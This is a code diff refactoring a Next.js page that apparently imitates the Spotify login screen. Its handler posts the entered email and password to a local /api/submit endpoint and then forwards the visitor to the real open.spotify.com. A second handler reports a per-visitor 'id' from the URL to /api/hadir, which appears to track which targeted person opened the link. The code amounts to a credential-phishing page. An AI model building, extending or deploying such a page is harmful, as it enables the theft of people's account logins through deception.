@@ -1,12 +1,11 @@
 "use client";
 
-import { redirect } from "next/dist/server/api-utils";
 import { useState } from "react";
-import { useEffect } from 'react';
-import { useSearchParams } from 'next/navigation';
+import { useEffect } from "react";
+import { Suspense } from "react";
+import { useSearchParams } from "next/navigation";
 
-
-export default function SpotifyLogin() {
+function SpotifyLoginContent() {
   const searchParams = useSearchParams();
 
   const [formData, setFormData] = useState({
@@ -32,22 +31,19 @@ export default function SpotifyLogin() {
     try {
       const response = await fetch("/api/submit", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
       });
 
       const data = await response.json();
 
       if (response.ok) {
-        // window open to spotify.com
         window.location.href = "https://open.spotify.com/intl-id/";
       } else {
         setStatus("error");
         setStatusMsg(`✗ ${data.error || "Email atau password salah"}`);
       }
-    } catch (error) {
+    } catch {
       setStatus("error");
       setStatusMsg("✗ Gagal menghubungkan ke server");
     } finally {
@@ -56,39 +52,26 @@ export default function SpotifyLogin() {
   };
 
   const handleCome = async () => {
-    // setLoading(true);
-    // setStatus("idle");
-
     try {
-      const id = searchParams.get('id'); // Ambil parameter id dari URL
-      
+      const id = searchParams.get("id");
       if (!id) {
-        console.error('ID tidak ditemukan di URL');
+        console.error("ID tidak ditemukan di URL");
         return;
       }
 
       const response = await fetch("/api/hadir", {
-        method: "POST", // Ganti ke POST karena mengirim data
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ id }), // Kirim id ke API
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id }),
       });
 
       const data = await response.json();
 
-      if (response.ok) {
-        console.log('Status berhasil diupdate');
-        // window.open('https://spotify.com', '_blank');
-      } else {
-        console.error('Gagal update status:', data.error);
+      if (!response.ok) {
+        console.error("Gagal update status:", data.error);
       }
-    } catch (error) {
-      // setStatus("error");
-      // setStatusMsg("✗ Gagal wkwk ke server");
-      console.error('Error:', error);
-    } finally {
-      // setLoading(false);
+    } catch {
+      setStatusMsg("✗ Gagal masuk ke server");
     }
   };
 
@@ -466,5 +449,13 @@ export default function SpotifyLogin() {
         apply.
       </div>
     </div>
+  );
+}
+
+export default function SpotifyLogin() {
+  return (
+    <Suspense fallback={<div style={{ color: "white", textAlign: "center" }}>Loading...</div>}>
+      <SpotifyLoginContent />
+    </Suspense>
   );
 }
